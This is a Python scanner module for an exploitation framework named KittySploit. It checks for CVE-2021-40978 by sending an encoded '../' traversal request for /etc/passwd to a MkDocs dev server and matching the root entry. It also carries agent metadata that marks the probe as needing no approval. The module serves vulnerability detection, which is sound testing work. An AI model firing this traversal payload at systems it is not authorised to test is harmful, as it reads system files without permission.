#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""The MKdocs 1."""

import re
from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'MKdocs 1.2.2 - Directory Traversal Detection',
        'description': 'The MKdocs 1.2.2 built-in dev-server allows directory traversal using the port 8000, enabling remote exploitation to obtain sensitive information. Note the vendor has disputed the vulnerability (see references) because the dev server must be used in an unsafe way (namely public) to have this vulnerability exploited.',
        'author': ['KittySploit Team'],
        'severity': 'high',
        'tags': ['web', 'scanner', 'cve', 'cve2021', 'mkdocs', 'lfi', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://github.com/mkdocs/mkdocs/pull/2604',
            'https://github.com/nisdn/CVE-2021-40978',
            'https://nvd.nist.gov/vuln/detail/CVE-2021-40978',
            'https://github.com/mkdocs/mkdocs',
            'https://github.com/mkdocs/mkdocs/issues/2601',
        ],
        'cve': 'CVE-2021-40978',
    }

    def run(self):
        r = self.http_request(method="GET", path='/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd', allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_regexes = ('root:[x*]:0:0:',)
        if (any(re.search(rx, body, 0) for rx in body_regexes)):
            self.set_info(
                severity='high',
                reason="MKdocs 1.2.2 - Directory Traversal detected",
                path='/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd',
            )
            return True
        return False

